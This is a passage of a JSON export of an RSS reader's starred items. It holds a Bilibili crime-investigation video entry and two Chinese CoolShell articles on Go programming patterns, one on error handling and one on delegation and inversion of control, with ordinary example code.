{
    "id": "user/black_desk/state/org.freshrss/starred",
    "title": "收藏文章列表",
    "author": "black_desk",
    "items": [
{
    "id": "https://www.bilibili.com/video/BV1Ut4y1b7MY",
    "timestampUsec": "1657644477278769",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "佛州铁轨旁的男子 | X调查",
    "author": ";X调查",
    "published": 1657621920,
    "updated": 1657621920,
    "alternate": [
        {
            "href": "https://www.bilibili.com/video/BV1Ut4y1b7MY",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "一名货运火车司驾驶着列车行驶在一片森林里，期间他发现铁轨旁躺着一位男子，司机见状后将此事报告给了警方，没想到之后牵扯出了一桩大案……<br><br><iframe src=\"https://player.bilibili.com/player.html?aid=983279399&amp;high_quality=1\" width=\"650\" height=\"477\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" referrerpolicy=\"no-referrer\" sandbox=\"allow-scripts allow-same-origin\"></iframe><br><img src=\"http://i2.hdslb.com/bfs/archive/f199f46c849940fac1c2619de16c2e1bd13c125c.jpg\" referrerpolicy=\"no-referrer\">"
    },
    "origin": {
        "streamId": 9,
        "title": "X调查",
        "htmlUrl": "https://space.bilibili.com/339233162",
        "feedUrl": "https://rsshub.black-desk.cn/bilibili/user/video/339233162"
    }
},
{
    "id": "https://coolshell.cn/?p=21140",
    "timestampUsec": "1657644531898523",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "Error",
        "Go",
        "golang",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go 编程模式：错误处理",
    "author": ";陈皓",
    "published": 1608632340,
    "updated": 1608632340,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21140.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/err-check-300x186.jpg\" alt=\"\" width=\"300\" height=\"186\">错误处理一直以一是编程必需要面对的问题，错误处理如果做的好的话，代码的稳定性会很好。不同的语言有不同的出现处理的方式。Go语言也一样，在本篇文章中，我们来讨论一下Go语言的出错出处，尤其是那令人抓狂的 <code>if err != nil</code> 。</p>\n<p>在正式讨论Go代码里满屏的 <code>if err != nil</code> 怎么办这个事之前，我想先说一说编程中的错误处理。这样可以让大家在更高的层面理解编程中的错误处理。</p>\n<section><h3>本文是全系列中第2 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span>Go 编程模式：错误处理</span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21128.html\" rel=\"prev\" title=\"Go编程模式：切片，接口，时间和性能\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21146.html\" rel=\"next\" title=\"Go 编程模式：Functional Options\">下一篇文章</a> »</span></nav></section>\n<h4>C语言的错误检查</h4>\n<p>首先，我们知道，处理错误最直接的方式是通过错误码，这也是传统的方式，在过程式语言中通常都是用这样的方式处理错误的。比如 C 语言，基本上来说，其通过函数的返回值标识是否有错，然后通过全局的 <code>errno</code> 变量并配合一个 <code>errstr</code> 的数组来告诉你为什么出错。</p>\n<p>为什么是这样的设计？道理很简单，除了可以共用一些错误，更重要的是这其实是一种妥协。比如：<code>read()</code>, <code>write()</code>, <code>open()</code> 这些函数的返回值其实是返回有业务逻辑的值。也就是说，这些函数的返回值有两种语义，一种是成功的值，比如 <code>open()</code> 返回的文件句柄指针 <code>FILE*</code> ，或是错误 <code>NULL</code>。这样会导致调用者并不知道是什么原因出错了，需要去检查 <code>errno</code> 来获得出错的原因，从而可以正确地处理错误。</p>\n<p>一般而言，这样的错误处理方式在大多数情况下是没什么问题的。但是也有例外的情况，我们来看一下下面这个 C 语言的函数：</p>\n<p><span></span></p>\n<pre data-enlighter-language=\"c\">int atoi(const char *str)</pre>\n<p>这个函数是把一个字符串转成整型。但是问题来了，如果一个要传的字符串是非法的（不是数字的格式），如 “ABC” 或者整型溢出了，那么这个函数应该返回什么呢？出错返回，返回什么数都不合理，因为这会和正常的结果混淆在一起。比如，返回 <code>0</code>，那么会和正常的对 “0” 字符的返回值完全混淆在一起。这样就无法判断出错的情况。你可能会说，是不是要检查一下 <code>errno</code>，按道理说应该是要去检查的，但是，我们在 C99 的规格说明书中可以看到这样的描述——</p>\n<blockquote><p>7.20.1The functions atof, atoi, atol, and atoll need not affect the value of the integer expression errno on an error. If the value of the result cannot be represented, the behavior is undeﬁned.</p></blockquote>\n<p>像<code>atoi()</code>, <code>atof()</code>, <code>atol()</code> 或是 <code>atoll()</code> 这样的函数是不会设置 <code>errno</code>的，而且，还说了，如果结果无法计算的话，行为是undefined。所以，后来，libc 又给出了一个新的函数<code>strtol()</code>，这个函数在出错的时会设置全局变量 <code>errno</code> ：</p>\n<pre data-enlighter-language=\"c\">long val = strtol(in_str, &amp;endptr, 10);  //10的意思是10进制\n\n//如果无法转换\nif (endptr == str) {\n    fprintf(stderr, \"No digits were found\\n\");\n    exit(EXIT_FAILURE);\n}\n\n//如果整型溢出了\nif ((errno == ERANGE &amp;&amp; (val == LONG_MAX || val == LONG_MIN)) {\n    fprintf(stderr, \"ERROR: number out of range for LONG\\n\");\n    exit(EXIT_FAILURE);\n }\n\n//如果是其它错误\nif (errno != 0 &amp;&amp; val == 0) {\n    perror(\"strtol\");\n    exit(EXIT_FAILURE);\n}\n</pre>\n<p>虽然，<code>strtol()</code> 函数解决了 <code>atoi()</code> 函数的问题，但是我们还是能感觉到不是很舒服和自然。</p>\n<p>因为，这种用 返回值 + errno 的错误检查方式会有一些问题:</p>\n<ul>\n<li>程序员一不小心就会忘记返回值的检查，从而造成代码的 Bug；</li>\n<li>函数接口非常不纯洁，正常值和错误值混淆在一起，导致语义有问题。</li>\n</ul>\n<p>所以，后来，有一些类库就开始区分这样的事情。比如，Windows 的系统调用开始使用 <code>HRESULT</code> 的返回来统一错误的返回值，这样可以明确函数调用时的返回值是成功还是错误。但这样一来，函数的 input 和 output 只能通过函数的参数来完成，于是出现了所谓的 入参 和 出参 这样的区别。</p>\n<p>然而，这又使得函数接入中参数的语义变得复杂，一些参数是入参，一些参数是出参，函数接口变得复杂了一些。而且，依然没有解决函数的成功或失败可以被人为忽略的问题。</p>\n<h4>Java的错误处理</h4>\n<p>Java语言使用 <code>try-catch-finally</code> 通过使用异常的方式来处理错误，其实，这比起C语言的错处理进了一大步，使用抛异常和抓异常的方式可以让我们的代码有这样的一些好处：</p>\n<ul>\n<li>函数接口在 input（参数）和 output（返回值）以及错误处理的语义是比较清楚的。</li>\n<li>正常逻辑的代码可以与错误处理和资源清理的代码分开，提高了代码的可读性。</li>\n<li>异常不能被忽略（如果要忽略也需要 catch 住，这是显式忽略）。</li>\n<li>在面向对象的语言中（如 Java），异常是个对象，所以，可以实现多态式的 catch。</li>\n<li>与状态返回码相比，异常捕捉有一个显著的好处是，函数可以嵌套调用，或是链式调用。比如：\n<ul>\n<li><code>int x = add(a, div(b,c));</code></li>\n<li><code>Pizza p = PizzaBuilder().SetSize(sz).SetPrice(p)...;</code></li>\n</ul>\n</li>\n</ul>\n<h4>Go语言的错误处理</h4>\n<p>Go 语言的函数支持多返回值，所以，可以在返回接口把业务语义（业务返回值）和控制语义（出错返回值）区分开来。Go 语言的很多函数都会返回 result, err 两个值，于是:</p>\n<ul>\n<li>参数上基本上就是入参，而返回接口把结果和错误分离，这样使得函数的接口语义清晰；</li>\n<li>而且，Go 语言中的错误参数如果要忽略，需要显式地忽略，用 _ 这样的变量来忽略；</li>\n<li>另外，因为返回的 <code>error</code> 是个接口（其中只有一个方法 <code>Error()</code>，返回一个 <code>string</code> ），所以你可以扩展自定义的错误处理。</li>\n</ul>\n<p>另外，如果一个函数返回了多个不同类型的 <code>error</code>，你也可以使用下面这样的方式：</p>\n<pre data-enlighter-language=\"golang\">if err != nil {\n  switch err.(type) {\n    case *json.SyntaxError:\n      ...\n    case *ZeroDivisionError:\n      ...\n    case *NullPointerError:\n      ...\n    default:\n      ...\n  }\n}</pre>\n<p>我们可以看到，Go语言的错误处理的的方式，本质上是返回值检查，但是他也兼顾了异常的一些好处 – 对错误的扩展。</p>\n<h4>资源清理</h4>\n<p>出错后是需要做资源清理的，不同的编程语言有不同的资源清理的编程模式：</p>\n<ul>\n<li>C语言 – 使用的是 <code>goto fail;</code> 的方式到一个集中的地方进行清理（有篇有意思的文章可以看一下《<a title=\"由苹果的低级Bug想到的\" href=\"https://coolshell.cn/articles/11112.html\" target=\"_blank\" rel=\"noopener\">由苹果的低级BUG想到的</a>》）</li>\n<li>C++语言- 一般来说使用 <a href=\"https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization\" target=\"_blank\" rel=\"noopener\">RAII模式</a>，通过面向对象的代理模式，把需要清理的资源交给一个代理类，然后在析构函数来解决。</li>\n<li>Java语言 – 可以在finally 语句块里进行清理。</li>\n<li>Go语言 – 使用 <code>defer</code> 关键词进行清理。</li>\n</ul>\n<p>下面是一个Go语言的资源清理的示例：</p>\n<pre data-enlighter-language=\"golang\">func Close(c io.Closer) {\n  err := c.Close()\n  if err != nil {\n    log.Fatal(err)\n  }\n}\n\nfunc main() {\n  r, err := Open(\"a\")\n  if err != nil {\n    log.Fatalf(\"error opening 'a'\\n\")\n  }\n  defer Close(r) // 使用defer关键字在函数退出时关闭文件。\n\n  r, err = Open(\"b\")\n  if err != nil {\n    log.Fatalf(\"error opening 'b'\\n\")\n  }\n  defer Close(r) // 使用defer关键字在函数退出时关闭文件。\n}</pre>\n<h4>Error Check  Hell</h4>\n<p>好了，说到 Go 语言的 <code>if err !=nil</code> 的代码了，这样的代码的确是能让人写到吐。那么有没有什么好的方式呢，有的。我们先看如下的一个令人崩溃的代码。</p>\n<pre data-enlighter-language=\"golang\">func parse(r io.Reader) (*Point, error) {\n\n    var p Point\n\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Longitude); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Latitude); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Distance); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.ElevationGain); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.ElevationLoss); err != nil {\n        return nil, err\n    }\n}</pre>\n<p>要解决这个事，我们可以用函数式编程的方式，如下代码示例：</p>\n<pre data-enlighter-language=\"golang\">func parse(r io.Reader) (*Point, error) {\n    var p Point\n    var err error\n    read := func(data interface{}) {\n        if err != nil {\n            return\n        }\n        err = binary.Read(r, binary.BigEndian, data)\n    }\n\n    read(&amp;p.Longitude)\n    read(&amp;p.Latitude)\n    read(&amp;p.Distance)\n    read(&amp;p.ElevationGain)\n    read(&amp;p.ElevationLoss)\n\n    if err != nil {\n        return &amp;p, err\n    }\n    return &amp;p, nil\n}</pre>\n<p>上面的代码我们可以看到，我们通过使用Closure 的方式把相同的代码给抽出来重新定义一个函数，这样大量的  <code>if err!=nil</code> 处理的很干净了。但是会带来一个问题，那就是有一个 <code>err</code> 变量和一个内部的函数，感觉不是很干净。</p>\n<p>那么，我们还能不能搞得更干净一点呢，我们从Go 语言的 <code>bufio.Scanner()</code>中似乎可以学习到一些东西：</p>\n<pre data-enlighter-language=\"golang\">scanner := bufio.NewScanner(input)\n\nfor scanner.Scan() {\n    token := scanner.Text()\n    // process token\n}\n\nif err := scanner.Err(); err != nil {\n    // process the error\n}</pre>\n<p>上面的代码我们可以看到，<code>scanner</code>在操作底层的I/O的时候，那个for-loop中没有任何的 <code>if err !=nil</code> 的情况，退出循环后有一个 <code>scanner.Err()</code> 的检查。看来使用了结构体的方式。模仿它，我们可以把我们的代码重构成下面这样：</p>\n<p>首先，定义一个结构体和一个成员函数</p>\n<pre data-enlighter-language=\"generic\">type Reader struct {\n    r   io.Reader\n    err error\n}\n\nfunc (r *Reader) read(data interface{}) {\n    if r.err == nil {\n        r.err = binary.Read(r.r, binary.BigEndian, data)\n    }\n}</pre>\n<p>然后，我们的代码就可以变成下面这样：</p>\n<pre data-enlighter-language=\"generic\">func parse(input io.Reader) (*Point, error) {\n    var p Point\n    r := Reader{r: input}\n\n    r.read(&amp;p.Longitude)\n    r.read(&amp;p.Latitude)\n    r.read(&amp;p.Distance)\n    r.read(&amp;p.ElevationGain)\n    r.read(&amp;p.ElevationLoss)\n\n    if r.err != nil {\n        return nil, r.err\n    }\n\n    return &amp;p, nil\n}</pre>\n<p>有了上面这个技术，我们的“<a href=\"https://martinfowler.com/bliki/FluentInterface.html\" target=\"_blank\" rel=\"noopener\">流式接口 Fluent Interface</a>”，也就很容易处理了。如下所示：</p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport (\n  \"bytes\"\n  \"encoding/binary\"\n  \"fmt\"\n)\n\n// 长度不够，少一个Weight\nvar b = []byte {0x48, 0x61, 0x6f, 0x20, 0x43, 0x68, 0x65, 0x6e, 0x00, 0x00, 0x2c} \nvar r = bytes.NewReader(b)\n\ntype Person struct {\n  Name [10]byte\n  Age uint8\n  Weight uint8\n  err error\n}\nfunc (p *Person) read(data interface{}) {\n  if p.err == nil {\n    p.err = binary.Read(r, binary.BigEndian, data)\n  }\n}\n\nfunc (p *Person) ReadName() *Person {\n  p.read(&amp;p.Name) \n  return p\n}\nfunc (p *Person) ReadAge() *Person {\n  p.read(&amp;p.Age) \n  return p\n}\nfunc (p *Person) ReadWeight() *Person {\n  p.read(&amp;p.Weight) \n  return p\n}\nfunc (p *Person) Print() *Person {\n  if p.err == nil {\n    fmt.Printf(\"Name=%s, Age=%d, Weight=%d\\n\",p.Name, p.Age, p.Weight)\n  }\n  return p\n}\n\nfunc main() {   \n  p := Person{}\n  p.ReadName().ReadAge().ReadWeight().Print()\n  fmt.Println(p.err)  // EOF 错误\n}\n</pre>\n<p>相信你应该看懂这个技巧了，但是，其使用场景也就只能在对于同一个业务对象的不断操作下可以简化错误处理，对于多个业务对象的话，还是得需要各种 <code>if err != nil</code>的方式。</p>\n<h4>包装错误</h4>\n<p>最后，多说一句，我们需要包装一下错误，而不是干巴巴地把<code>err</code>给返回到上层，我们需要把一些执行的上下文加入。</p>\n<p>通常来说，我们会使用 <code>fmt.Errorf()</code>来完成这个事，比如：</p>\n<pre data-enlighter-language=\"golang\">if err != nil {\n   return fmt.Errorf(\"something failed: %v\", err)\n}</pre>\n<p>另外，在Go语言的开发者中，更为普遍的做法是将错误包装在另一个错误中，同时保留原始内容：</p>\n<pre data-enlighter-language=\"golang\">type authorizationError struct {\n    operation string\n    err error   // original error\n}\n\nfunc (e *authorizationError) Error() string {\n    return fmt.Sprintf(\"authorization failed during %s: %v\", e.operation, e.err)\n}</pre>\n<p>当然，更好的方式是通过一种标准的访问方法，这样，我们最好使用一个接口，比如 <code>causer</code>接口中实现 <code>Cause()</code> 方法来暴露原始错误，以供进一步检查：</p>\n<pre data-enlighter-language=\"golang\">type causer interface {\n    Cause() error\n}\n\nfunc (e *authorizationError) Cause() error {\n    return e.err\n}\n</pre>\n<p> </p>\n<p>这里有个好消息是，这样的代码不必再写了，有一个第三方的错误库（<a href=\"https://github.com/pkg/errors\" target=\"_blank\" rel=\"noopener\">github.com/pkg/errors</a>），对于这个库，我无论到哪都能看到他的存在，所以，这个基本上来说就是事实上的标准了。代码示例如下：</p>\n<pre data-enlighter-language=\"golang\">import \"github.com/pkg/errors\"\n\n//错误包装\nif err != nil {\n    return errors.Wrap(err, \"read failed\")\n}\n\n// Cause接口\nswitch err := errors.Cause(err).(type) {\ncase *MyError:\n    // handle specifically\ndefault:\n    // unknown error\n}</pre>\n<h4>参考文章</h4>\n<ul>\n<li><b>Golang Error Handling lesson by Rob Pike<br>\n</b><a href=\"http://jxck.hatenablog.com/entry/golang-error-handling-lesson-by-rob-pike\">http://jxck.hatenablog.com/entry/golang-error-handling-lesson-by-rob-pike</a></li>\n<li><b>Errors are values<br>\n</b><a href=\"https://blog.golang.org/errors-are-values\">https://blog.golang.org/errors-are-values</a></li>\n</ul>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21263.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21214.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21214",
    "timestampUsec": "1657644531898527",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "Go",
        "golang",
        "IoC",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go编程模式：委托和反转控制",
    "author": ";陈皓",
    "published": 1608973020,
    "updated": 1608973020,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21214.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<figure aria-describedby=\"caption-attachment-21256\"><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-300x298.png\" alt=\"\" width=\"300\" height=\"298\"><figcaption>图片来源：<a href=\"https://gophersource.com/\" target=\"_blank\" rel=\"noopener\">GopherSource</a></figcaption></figure>\n<p>反转控制<a title=\"IoC - Inversion of Control\" href=\"https://en.wikipedia.org/wiki/Inversion_of_control\" target=\"_blank\" rel=\"noopener\">IoC – Inversion of Control</a> 是一种软件设计的方法，其主要的思想是把控制逻辑与业务逻辑分享，不要在业务逻辑里写控制逻辑，这样会让控制逻辑依赖于业务逻辑，而是反过来，让业务逻辑依赖控制逻辑。在《<a href=\"https://coolshell.cn/articles/9949.html\" target=\"_blank\" rel=\"noopener\">IoC/DIP其实是一种管理思想</a>》中的那个开关和电灯的示例一样，开关是控制逻辑，电器是业务逻辑，不要在电器中实现开关，而是把开关抽象成一种协议，让电器都依赖之。这样的编程方式可以有效的降低程序复杂度，并提升代码重用。</p>\n<section><h3>本文是全系列中第4 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span>Go编程模式：委托和反转控制</span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21146.html\" rel=\"prev\" title=\"Go 编程模式：Functional Options\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21164.html\" rel=\"next\" title=\"Go编程模式：Map-Reduce\">下一篇文章</a> »</span></nav></section>\n<p>面向对象的设计模式这里不提了，我们来看看Go语言使用Embed结构的一个示例。</p>\n<p><span></span></p>\n<h4>嵌入和委托</h4>\n<h5>结构体嵌入</h5>\n<p>在Go语言中，我们可以很方便的把一个结构体给嵌到另一个结构体中。如下所示：</p>\n<pre data-enlighter-language=\"golang\">type Widget struct {\n    X, Y int\n}\ntype Label struct {\n    Widget        // Embedding (delegation)\n    Text   string // Aggregation\n}</pre>\n<p>上面的示例中，我们把 <code>Widget</code>嵌入到了 <code>Label</code> 中，于是，我们可以这样使用：</p>\n<pre data-enlighter-language=\"golang\">label := Label{Widget{10, 10}, \"State:\"}\n\nlabel.X = 11\nlabel.Y = 12</pre>\n<p>如果在 <code>Label</code> 结构体里出现了重名，就需要解决重名，例如，如果 成员 <code>X</code> 重名，用 <code>label.X</code>表明 是自己的<code>X</code> ，用  <code>label.Wedget.X</code> 表示嵌入过来的。</p>\n<p>有了这样的嵌入，就可以像UI组件一样的在结构构的设计上进行层层分解。比如，我可以新出来两个结构体 <code>Button</code> 和 <code>ListBox</code>：</p>\n<pre data-enlighter-language=\"golang\">type Button struct {\n    Label // Embedding (delegation)\n}\n\ntype ListBox struct {\n    Widget          // Embedding (delegation)\n    Texts  []string // Aggregation\n    Index  int      // Aggregation\n}</pre>\n<h5>方法重写</h5>\n<p>然后，我们需要两个接口 <code>Painter</code> 用于把组件画出来，<code>Clicker</code> 用于表明点击事件：</p>\n<pre data-enlighter-language=\"golang\">type Painter interface {\n    Paint()\n}\n \ntype Clicker interface {\n    Click()\n}</pre>\n<p>当然，</p>\n<ul>\n<li>对于 <code>Lable</code> 来说，只有 <code>Painter</code> ，没有<code>Clicker</code></li>\n<li>对于 <code>Button</code> 和 <code>ListBox</code>来说，<code>Painter</code> 和<code>Clicker</code>都有。</li>\n</ul>\n<p>下面是一些实现：</p>\n<pre data-enlighter-language=\"golang\">func (label Label) Paint() {\n  fmt.Printf(\"%p:Label.Paint(%q)\\n\", &amp;label, label.Text)\n}\n\n//因为这个接口可以通过 Label 的嵌入带到新的结构体，\n//所以，可以在 Button 中可以重载这个接口方法以\nfunc (button Button) Paint() { // Override\n    fmt.Printf(\"Button.Paint(%s)\\n\", button.Text)\n}\nfunc (button Button) Click() {\n    fmt.Printf(\"Button.Click(%s)\\n\", button.Text)\n}\n\n\nfunc (listBox ListBox) Paint() {\n    fmt.Printf(\"ListBox.Paint(%q)\\n\", listBox.Texts)\n}\nfunc (listBox ListBox) Click() {\n    fmt.Printf(\"ListBox.Click(%q)\\n\", listBox.Texts)\n}</pre>\n<p>这里，需要重点提示一下，<strong><code>Button.Paint()</code> 接口可以通过 Label 的嵌入带到新的结构体，如果 <code>Button.Paint()</code> 不实现的话，会调用 <code>Label.Paint()</code> ，所以，在 <code>Button</code> 中声明 <code>Paint()</code> 方法，相当于Override</strong>。</p>\n<h5>嵌入结构多态</h5>\n<p>通过下面的程序可以看到，整个多态是怎么执行的。</p>\n<pre data-enlighter-language=\"golang\">button1 := Button{Label{Widget{10, 70}, \"OK\"}}\nbutton2 := NewButton(50, 70, \"Cancel\")\nlistBox := ListBox{Widget{10, 40}, \n    []string{\"AL\", \"AK\", \"AZ\", \"AR\"}, 0}\n\nfor _, painter := range []Painter{label, listBox, button1, button2} {\n    painter.Paint()\n}\n \nfor _, widget := range []interface{}{label, listBox, button1, button2} {\n  widget.(Painter).Paint()\n  if clicker, ok := widget.(Clicker); ok {\n    clicker.Click()\n  }\n  fmt.Println() // print a empty line \n}</pre>\n<p>我们可以看到，我们可以使用接口来多态，也可以使用 泛型的 <code>interface{}</code> 来多态，但是需要有一个类型转换。</p>\n<h4>反转控制</h4>\n<p>我们再来看一个示例，我们有一个存放整数的数据结构，如下所示：</p>\n<pre data-enlighter-language=\"golang\">type IntSet struct {\n    data map[int]bool\n}\nfunc NewIntSet() IntSet {\n    return IntSet{make(map[int]bool)}\n}\nfunc (set *IntSet) Add(x int) {\n    set.data[x] = true\n}\nfunc (set *IntSet) Delete(x int) {\n    delete(set.data, x)\n}\nfunc (set *IntSet) Contains(x int) bool {\n    return set.data[x]\n}</pre>\n<p>其中实现了 <code>Add()</code> 、<code>Delete()</code> 和 <code>Contains()</code> 三个操作，前两个是写操作，后一个是读操作。</p>\n<h5>实现Undo功能</h5>\n<p>现在我们想实现一个 Undo 的功能。我们可以把把 <code>IntSet</code> 再包装一下变成 <code>UndoableIntSet</code> 代码如下所示：</p>\n<pre data-enlighter-language=\"golang\">type UndoableIntSet struct { // Poor style\n    IntSet    // Embedding (delegation)\n    functions []func()\n}\n \nfunc NewUndoableIntSet() UndoableIntSet {\n    return UndoableIntSet{NewIntSet(), nil}\n}\n \n\nfunc (set *UndoableIntSet) Add(x int) { // Override\n    if !set.Contains(x) {\n        set.data[x] = true\n        set.functions = append(set.functions, func() { set.Delete(x) })\n    } else {\n        set.functions = append(set.functions, nil)\n    }\n}\n\n\nfunc (set *UndoableIntSet) Delete(x int) { // Override\n    if set.Contains(x) {\n        delete(set.data, x)\n        set.functions = append(set.functions, func() { set.Add(x) })\n    } else {\n        set.functions = append(set.functions, nil)\n    }\n}\n\nfunc (set *UndoableIntSet) Undo() error {\n    if len(set.functions) == 0 {\n        return errors.New(\"No functions to undo\")\n    }\n    index := len(set.functions) - 1\n    if function := set.functions[index]; function != nil {\n        function()\n        set.functions[index] = nil // For garbage collection\n    }\n    set.functions = set.functions[:index]\n    return nil\n}</pre>\n<p>在上面的代码中，我们可以看到</p>\n<ul>\n<li>我们在 <code>UndoableIntSet</code> 中嵌入了<code>IntSet</code> ，然后Override了 它的 <code>Add()</code>和 <code>Delete()</code> 方法。</li>\n<li><code>Contains()</code> 方法没有Override，所以，会被带到 <code>UndoableInSet</code> 中来了。</li>\n<li>在Override的 <code>Add()</code>中，记录 <code>Delete</code> 操作</li>\n<li>在Override的 <code>Delete()</code> 中，记录 <code>Add</code> 操作</li>\n<li>在新加入 <code>Undo()</code> 中进行Undo操作。</li>\n</ul>\n<p>通过这样的方式来为已有的代码扩展新的功能是一个很好的选择，这样，可以在重用原有代码功能和重新新的功能中达到一个平衡。但是，这种方式最大的问题是，Undo操作其实是一种控制逻辑，并不是业务逻辑，所以，在复用 Undo这个功能上是有问题。因为其中加入了大量跟 <code>IntSet</code> 相关的业务逻辑。</p>\n<h5>反转依赖</h5>\n<p>现在我们来看另一种方法：</p>\n<p>我们先声明一种函数接口，表现我们的Undo控制可以接受的函数签名是什么样的：</p>\n<pre data-enlighter-language=\"golang\">type Undo []func()</pre>\n<p>有了上面这个协议后，我们的Undo控制逻辑就可以写成如下：</p>\n<pre data-enlighter-language=\"golang\">func (undo *Undo) Add(function func()) {\n  *undo = append(*undo, function)\n}\n\nfunc (undo *Undo) Undo() error {\n  functions := *undo\n  if len(functions) == 0 {\n    return errors.New(\"No functions to undo\")\n  }\n  index := len(functions) - 1\n  if function := functions[index]; function != nil {\n    function()\n    functions[index] = nil // For 